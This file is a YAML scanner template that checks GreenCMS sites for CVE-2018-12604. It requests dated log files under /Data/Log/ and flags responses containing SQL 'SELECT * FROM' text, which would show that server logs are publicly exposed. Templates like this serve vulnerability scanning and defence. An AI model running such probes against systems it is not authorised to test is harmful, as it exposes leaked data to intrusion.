name: poc-yaml-greencms-cve-2018-12604
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /Data/Log/19_01_01.log
            follow_redirects: false
        expression: response.status == 200 && "SELECT\\s\\*\\sFROM".bmatches(response.body)
    r1:
        request:
            cache: true
            method: GET
            path: /Data/Log/20_01_01.log
            follow_redirects: false
        expression: response.status == 200 && "SELECT\\s\\*\\sFROM".bmatches(response.body)
    r2:
        request:
            cache: true
            method: GET
            path: /Data/Log/21_01_01.log
            follow_redirects: false
        expression: response.status == 200 && "SELECT\\s\\*\\sFROM".bmatches(response.body)
    r3:
        request:
            cache: true
            method: GET
            path: /Data/Log/22_01_01.log
            follow_redirects: false
        expression: response.status == 200 && "SELECT\\s\\*\\sFROM".bmatches(response.body)
expression: r0() || r1() || r2() || r3()
detail:
    author: 2husky
    links:
        - https://nitesculucian.github.io/2018/10/26/attackdefense-com-id-cve-2018-12604-exploit/
    vulnerability:
        id: CT-78113
        level: high
